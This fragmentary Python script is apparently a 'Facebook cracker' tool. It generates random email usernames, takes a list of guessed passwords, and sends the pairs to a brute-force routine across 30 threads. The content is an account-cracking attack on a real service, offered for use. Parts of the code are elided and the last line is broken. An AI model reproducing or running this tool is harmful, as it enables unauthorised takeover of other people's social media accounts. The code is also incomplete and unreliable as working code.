...
def random_email():
  ...
  print('''
   \33[31;1m[ FACEBOOK CRACKER RANDOM EMAIL ]
    \33[31;1m[ Recode By JEWEL MAVIS XD ]
  ...
  jml=int(input('''
  \33[0;32mTotal Facebook?, Example: 15
  \33[0;32mTotal: '''))
  setpw=input('''
  \33[0;36mSet password :)
\33[0;36mContoh: Jewel123,putri1234
  \33[0;36mSet password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
\33[33;1mJEWEL Cracker :)
Cracking....!!!!!!!!!!!!!!
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
...
def pilih(): 
  ...
  ''')
  pil=int(input('\33[33;1press っ︻デ═一?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_facebook()
...
Enter #000E82() if __name__ == '__main__' else exit('\33[31;1mError 404 Not Found:(!.' 